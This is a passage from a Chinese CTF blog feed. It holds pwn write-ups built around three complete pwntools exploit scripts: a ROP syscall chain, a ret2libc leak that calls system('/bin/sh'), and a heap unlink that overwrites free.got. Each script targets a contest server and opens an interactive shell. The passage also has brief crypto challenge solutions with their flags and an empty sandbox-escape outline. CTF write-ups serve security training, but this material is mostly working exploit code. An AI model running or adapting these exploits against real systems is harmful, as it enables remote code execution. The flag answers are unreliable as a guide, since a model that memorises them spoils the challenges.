pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 0x000000000046fea5) # syscall ; ret< span><br><span class="line">return p</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn9")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">#0x401196</span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">payload = 0x9*'a'</span><br><span class="line">b6 = base64.b64encode(payload)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(b6)</span><br><span class="line">sh.recvuntil("a" * 9)</span><br><span class="line">canary = u64('\x00' + sh.recv(7))</span><br><span class="line">sh.recvuntil("continue")</span><br><span class="line">sh.sendline("yes")</span><br><span class="line">payload = 0x8 * "a" + p64(canary)</span><br><span class="line">payload += 'a' * 8 + rop()</span><br><span class="line">b6 = base64.b64encode(payload)</span><br><span class="line">sh.sendline(b6)</span><br><span class="line">sh.recvuntil("continue")</span><br><span class="line"></span><br><span class="line">sh.sendline("no")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50009,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></pre></td></tr></tbody></table></figure></div><h2 id="0x3-於讴"><a href="#0x3-於讴" class="headerlink" title="0x3 於讴"></a>0x3 於讴</h2><h3 id="导入IDA，发现需要先绕过如下代码"><a href="#导入IDA，发现需要先绕过如下代码" class="headerlink" title="导入IDA，发现需要先绕过如下代码"></a>导入IDA，发现需要先绕过如下代码</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/15.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/15.png" class="lazyload"></a></p><h3 id="绕过方法很简单，输入大于0x3E7的数字即可"><a href="#绕过方法很简单，输入大于0x3E7的数字即可" class="headerlink" title="绕过方法很简单，输入大于0x3E7的数字即可"></a>绕过方法很简单，输入大于0x3E7的数字即可</h3><h3 id="绕过之后我们，就是典型的栈溢出了"><a href="#绕过之后我们，就是典型的栈溢出了" class="headerlink" title="绕过之后我们，就是典型的栈溢出了"></a>绕过之后我们，就是典型的栈溢出了</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/16.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/16.png" class="lazyload"></a></p><h3 id="允许read-0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露-libc-start-main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc-system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下"><a href="#允许read-0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露-libc-start-main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc-system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下" class="headerlink" title="允许read 0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露__libc_start_main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc_system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下"></a>允许read 0x100字节，远远大于缓存区，可以考虑先构造ROP通过puts来泄露__libc_start_main的地址，然后通过计算得到libc基址，然后再计算system地址，然后传好参数就可以跳到libc_system拿shell了，但是最大的问题是没有libc，这里我们有工具可以搜索libc，但是一个都没有找到，可能是一个很老的libc了，所以我们根据我们已经打出的pwn题来其他题目的libc来尝试，最终找到了正确的libc，最后如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf1 = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc.so")</span><br><span class="line">pop_rdi_ret = 0x0000000000414fc3</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000414fc1</span><br><span class="line">sh.sendline(str(2000))</span><br><span class="line">sh.recvuntil("?")</span><br><span class="line">payload = 'a' * (0x10 + 8)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf1.got['__libc_start_main'])</span><br><span class="line">payload += p64(elf1.plt['puts'])</span><br><span class="line">payload += p64(0x4007C3)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system'] + 0x1b</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline(str(2000))</span><br><span class="line">        sh.recvuntil("?")</span><br><span class="line">payload = 'a' * (0x10 + 8)</span><br><span class="line">        payload += p64(pop_rdi_ret)</span><br><span class="line">        payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50006 ,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x4-正定"><a href="#0x4-正定" class="headerlink" title="0x4 正定"></a>0x4 正定</h2><h3 id="导入IDA，发现有一个shell函数"><a href="#导入IDA，发现有一个shell函数" class="headerlink" title="导入IDA，发现有一个shell函数"></a>导入IDA，发现有一个shell函数</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/17.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/17.png" class="lazyload"></a></p><h3 id="只要执行了这里就可以直接拿到shell"><a href="#只要执行了这里就可以直接拿到shell" class="headerlink" title="只要执行了这里就可以直接拿到shell"></a>只要执行了这里就可以直接拿到shell</h3><p>漏洞分析：edit功能存在堆溢出<br>利用方式：考虑到程序没有开启got保护和pie，且malloc来的指针位于bss段，所以考虑unlink，通过unlink可以使第一个ptr变成chunk_list – 0x18，这样edit的时候就可以再一次覆盖第一个堆块的指针，就可以实现任意地址写，然后我们把第一个堆块的指针覆盖为free.got这样就我们再edit一次第一个堆块就可以修改free.got的内容，将free.got的内容修改为shell函数的地址，然后free任意一个堆块，就可以执行system(“/bin/sh\x00”)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn14")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("Your choice : ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn14")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">chunk_list = 0x4040C0</span><br><span class="line">add(0x68,'\x11' * 0x68)</span><br><span class="line">add(0x80,'\x22' * 0x80)</span><br><span class="line">add(0x20,'\x33' * 0x20)</span><br><span class="line">payload = p64(0) + p64(0x61) + p64(chunk_list - 0x18) + p64(chunk_list - 0x10)</span><br><span class="line">payload = payload.ljust(0x60,'\x00')</span><br><span class="line">payload += p64(0x60) + p64(0x90)</span><br><span class="line">edit(0,0x80,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = '\xaa' * 0x18</span><br><span class="line">payload += p64(0x404018)</span><br><span class="line">edit(0,0x80,payload)</span><br><span class="line">edit(0,0x80,p64(0x40158C))</span><br><span class="line">free(0)</span><br><span class="line">#if debug == 1:</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline("./flag.sh 1DJB96JCF03SHB2GJ2S1M5LVOE8PTTB3")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.4",50014 ,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Pwn&quot;&gt;&lt;a href=&quot;#Pwn&quot; class=&quot;headerlink&quot; title=&quot;Pwn&quot;&gt;&lt;/a&gt;Pwn&lt;/h1&gt;&lt;h2 id=&quot;0x1-副墨&quot;&gt;&lt;a href=&quot;#0x1-副墨&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-19年网络与信息安全领域专项赛</title>
    <link href="http://yoursite.com/2019/08/26/CTF-19%E5%B9%B4%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/08/26/CTF-19%E5%B9%B4%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/</id>
    <published>2019-08-26T06:48:43.000Z</published>
    <updated>2019-08-30T07:25:10.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-Python沙盒逃逸</title>
    <link href="http://yoursite.com/2019/08/24/Pwn-Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
    <id>http://yoursite.com/2019/08/24/Pwn-Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</id>
    <published>2019-08-24T07:15:02.000Z</published>
    <updated>2019-08-24T15:50:04.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h3 id="本文参考以下网站，进行重新排版整合"><a href="#本文参考以下网站，进行重新排版整合" class="headerlink" title="本文参考以下网站，进行重新排版整合"></a>本文参考以下网站，进行重新排版整合</h3><h3 id="https-www-chainnews-com-articles-151288323475-htm"><a href="#https-www-chainnews-com-articles-151288323475-htm" class="headerlink" title="https://www.chainnews.com/articles/151288323475.htm"></a><a href="https://www.chainnews.com/articles/151288323475.htm" target="_blank" rel="noopener">https://www.chainnews.com/articles/151288323475.htm</a></h3><h1 id="Python沙盒逃逸"><a href="#Python沙盒逃逸" class="headerlink" title="Python沙盒逃逸"></a>Python沙盒逃逸</h1><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><h2 id="Python2逃逸方式"><a href="#Python2逃逸方式" class="headerlink" title="Python2逃逸方式"></a>Python2逃逸方式</h2><h2 id="Python3逃逸方式"><a href="#Python3逃逸方式" class="headerlink" title="Python3逃逸方式"></a>Python3逃逸方式</h2></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h3 id=&quot;本文参考以下网站，进行重新排版整合&quot;&gt;&lt;a href=&quot;#本文参考以下网站，进行重新排版整合&quot; class=&quot;headerlink&quot; title=&quot;本文参考以下网站，进行重新排版整合&quot;&gt;&lt;/a&gt;本文参考以下网站，进
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-BUUCTF-Crypto刷题之旅-(1)</title>
    <link href="http://yoursite.com/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
    <id>http://yoursite.com/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</id>
    <published>2019-08-21T02:22:43.000Z</published>
    <updated>2019-08-23T06:20:24.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-看我回旋踢"><a href="#0x01-看我回旋踢" class="headerlink" title="0x01 看我回旋踢"></a>0x01 看我回旋踢</h2><h3 id="题目：synt-5pq1004q-86n5-46q8-o720-oro5on0417r1"><a href="#题目：synt-5pq1004q-86n5-46q8-o720-oro5on0417r1" class="headerlink" title="题目：synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}"></a>题目：synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接考虑凯撒密码</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/1.png" class="lazyload"></a></p><h3 id="flag-5cd1004d-86a5-46d8-b720-beb5ba0417e1"><a href="#flag-5cd1004d-86a5-46d8-b720-beb5ba0417e1" class="headerlink" title="flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}"></a>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</h3><h2 id="0x02-MD5"><a href="#0x02-MD5" class="headerlink" title="0x02 MD5"></a>0x02 MD5</h2><h3 id="题目：e00cf25ad42683b3df678c61f42c6bda"><a href="#题目：e00cf25ad42683b3df678c61f42c6bda" class="headerlink" title="题目：e00cf25ad42683b3df678c61f42c6bda"></a>题目：e00cf25ad42683b3df678c61f42c6bda</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解法：</span><br><span class="line">https://www.cmd5.com/    直接解密</span><br><span class="line">原文: admin1</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-admin1"><a href="#flag-admin1" class="headerlink" title="flag{admin1}"></a>flag{admin1}</h3><h2 id="0x03-Url编码"><a href="#0x03-Url编码" class="headerlink" title="0x03 Url编码"></a>0x03 Url编码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目：%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按照题意，直接URL解码</span><br><span class="line">http://tool.chinaz.com/tools/urlencode.aspx</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-and-1-1"><a href="#flag-and-1-1" class="headerlink" title="flag{and 1=1}"></a>flag{and 1=1}</h3><h2 id="0x04-摩丝"><a href="#0x04-摩丝" class="headerlink" title="0x04 摩丝"></a>0x04 摩丝</h2><h3 id="题目：-—-…-–-—"><a href="#题目：-—-…-–-—" class="headerlink" title="题目：.. .-.. — …- . -.– — ..-"></a>题目：.. .-.. — …- . -.– — ..-</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按照题意，直接解密</span><br><span class="line">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-ILOVEYOU"><a href="#flag-ILOVEYOU" class="headerlink" title="flag{ILOVEYOU}"></a>flag{ILOVEYOU}</h3><h2 id="0x05-变异凯撒"><a href="#0x05-变异凯撒" class="headerlink" title="0x05 变异凯撒"></a>0x05 变异凯撒</h2><h3 id="题目：加密密文：afZ-r9VYfScOeO-UL-RWUc-格式：flag"><a href="#题目：加密密文：afZ-r9VYfScOeO-UL-RWUc-格式：flag" class="headerlink" title="题目：加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }"></a>题目：加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先用普通凯撒密码跑了一下，啥也没有</span><br><span class="line">然后根据flag格式，前五位为flag{</span><br><span class="line">可以推算出偏移，脚本如下：</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">s = 'afZ_r9VYfScOeO_UL^RWUc'</span><br><span class="line">flag = ''</span><br><span class="line">offset = 5</span><br><span class="line">for i in s:</span><br><span class="line">flag += str(chr(ord(i) + offset))</span><br><span class="line">offset += 1</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-Caesar-variation"><a href="#flag-Caesar-variation" class="headerlink" title="flag{Caesar_variation}"></a>flag{Caesar_variation}</h3><h2 id="0x06-Quoted-printable"><a href="#0x06-Quoted-printable" class="headerlink" title="0x06 Quoted-printable"></a>0x06 Quoted-printable</h2><h3 id="题目：-E9-82-A3-E4-BD-A0-E4-B9-9F-E5-BE-88-E6-A3-92-E5-93-A6"><a href="#题目：-E9-82-A3-E4-BD-A0-E4-B9-9F-E5-BE-88-E6-A3-92-E5-93-A6" class="headerlink" title="题目：=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6"></a>题目：=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度搜索 Quoted-printable</span><br><span class="line">http://web.chacuo.net/charsetquotedprintable</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/21/CTF-BUUCTF-Crypto%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/2.png" class="lazyload"></a></p><h3 id="flag-那你也很棒哦"><a href="#flag-那你也很棒哦" class="headerlink" title="flag{那你也很棒哦}"></a>flag{那你也很棒哦}</h3><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><h3 id="题目：姓名：张三-生日：19900315"><a href="#题目：姓名：张三-生日：19900315" class="headerlink" title="题目：姓名：张三   生日：19900315"></a>题目：姓名：张三   生日：19900315</h3><h3 id="key格式为key-xxxxxxxxxx"><a href="#key格式为key-xxxxxxxxxx" class="headerlink" title="key格式为key{xxxxxxxxxx}"></a>key格式为key{xxxxxxxxxx}</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无脑题，不知道有什么意义</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-zs19900315"><a href="#flag-zs19900315" class="headerlink" 